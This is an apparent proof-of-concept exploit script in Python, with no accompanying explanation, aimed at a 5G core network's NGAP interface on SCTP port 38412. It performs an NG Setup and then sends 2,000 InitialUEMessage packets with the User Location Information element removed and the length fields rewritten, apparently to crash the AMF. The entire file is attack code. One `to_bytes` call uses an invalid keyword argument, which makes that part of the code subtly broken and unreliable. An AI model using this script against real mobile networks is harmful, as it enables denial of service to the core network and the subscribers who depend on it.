import socket
import sctp
import time

def get_ng_setup_request():
    data = [0x00, 0x15, 0x00, 0x41, 0x00, 0x00, 0x04, 0x00, 0x1b, 0x00, 0x09, 0x00, 0x99, 0xf9, 0x07, 0x50, 0x00, 0x00, 0x00, 0x01, 0x00, 0x52, 0x40, 0x17, 0x0a, 0x00, 0x55, 0x45, 0x52, 0x41, 0x4e, 0x53, 0x49, 0x4d, 0x2d, 0x67, 0x6e, 0x62, 0x2d, 0x39, 0x39, 0x39, 0x2d, 0x37, 0x30, 0x2d, 0x31, 0x00, 0x66, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x99, 0xf9, 0x07, 0x00, 0x00, 0x00, 0x08, 0x00, 0x15, 0x40, 0x01, 0x40]
    return bytes(data)

def get_malformed_init_ue(ran_ue_id: int):
    data = [0x00, 0x0f, 0x40, 0x48, 0x00, 0x00, 0x05, 0x00, 0x55, 0x00, 0x02, 0x00, 0x01, 0x00, 0x26, 0x00, 0x1a, 0x19, 0x7e, 0x00, 0x41, 0x79, 0x00, 0x0d, 0x01, 0x99, 0xf9, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x2e, 0x04, 0xf0, 0xf0, 0xf0, 0xf0, 0x00, 0x79, 0x00, 0x13, 0x50, 0x99, 0xf9, 0x07, 0x00, 0x00, 0x00, 0x01, 0x00, 0x99, 0xf9, 0x07, 0x00, 0x00, 0x01, 0xe8, 0xb4, 0x3d, 0x4e, 0x00, 0x5a, 0x40, 0x01, 0x18, 0x00, 0x70, 0x40, 0x01, 0x00]
    data_len = len(data)

    usr_loc_off = 43
    usr_loc_len = 23

    malformed_data = []

    for i in range(data_len):
        if (i < usr_loc_off or i >= usr_loc_off + usr_loc_len):
            malformed_data.append(data[i])

    malformed_data[3] = data_len - usr_loc_len - 4
    malformed_data[6] = 4

    ran_ue_id_bytes = ran_ue_id.to_bytes(usr_loc_len=2, byteorder="big")
    malformed_data[12] = ran_ue_id_bytes[0]
    if (ran_ue_id > 255):
        malformed_data[3] += 1
        malformed_data[10] += 1
        malformed_data[11] = 64
        malformed_data.insert(13, ran_ue_id_bytes[1])

    return bytes(malformed_data)


sk = sctp.sctpsocket_tcp(socket.AF_INET)
sk.connect(("192.0.2.1", 38412))

sk.sctp_send(get_ng_setup_request())

for i in range(1, 2000):
    sk.sctp_send(get_malformed_init_ue(i))

input("Press any key to exit.")
sk.close()
